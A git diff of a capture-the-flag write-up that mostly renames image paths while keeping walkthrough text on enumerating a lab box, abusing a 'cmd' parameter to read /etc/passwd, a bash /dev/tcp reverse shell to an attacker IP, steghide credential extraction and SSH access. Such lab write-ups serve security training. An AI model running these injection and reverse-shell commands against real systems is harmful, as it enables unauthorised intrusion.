@@ -26,7 +26,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
 
 We begin to enumerate the HTTP server by running feroxbuster which reveals the assets subdirectory.&#x20;
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Feroxbuster doesn't reveal any further details which is where we'll bring GoBuster in for the fine tuning, we'll configure our scan to search for specific file types which gives us a hit for "index.php"
 
@@ -34,7 +34,7 @@ Feroxbuster doesn't reveal any further details which is where we'll bring GoBust
 gobuster dir -u 10.10.42.185/assets -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,css,zip
 ```
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This just appears to be an empty PHP file to the client, but since PHP code is executed server side there may be something that is happening behind the scenes that we can't see. Curious to see if there is anything we can pass to this, we utilise wfuzz which should find any endpoints of usage, and we'll also specify the wordlist to be the "common.txt" wordlist which is stored in the following location, on a default Kali install.
 
@@ -44,7 +44,7 @@ This just appears to be an empty PHP file to the client, but since PHP code is e
 
 We're going out on a limb and try to read the `/etc/passwd` file on the machine and we get a hit with the "cmd" parameter.
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Foothold
 
@@ -58,9 +58,9 @@ bash -c 'bash -i >& /dev/tcp/10.8.61.246/9999 0>&1'
 
 Run our first command to download the binary onto the box and store it in the tmp directory, which we can assume we have write access in.
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 We double check to ensure it's saved, which we can confirm through the output from the website, which is Base64 encoded.
 
@@ -70,11 +70,11 @@ We double check to ensure it's saved, which we can confirm through the output fr
 
 We make our binary executable iwth `chmod +x /tmp/shell.sh` and then run it with `bash /tmp/shell.sh` which gets us a reverse shell as www-data.
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 When on the box we find two images in the images folder that we'd found through our enumeration then begin working backwards, eventually finding another folder, "Hidden\_Content" in `/var/www` which we find another Base64 encoded flag in. Decoding it gives us some kind of password..
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## User
 
@@ -88,15 +88,15 @@ FF D8 FF E0 00 10 4A 46 49 46 00 01
 
 We can see that our file changes from a "data" file to a complete JPEG file, indicating it is back to its restored state.
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 We run steghide extract with our credentials and get "creds.txt"
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 We take these creds and SSH into the box which gives us user!
 
-<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
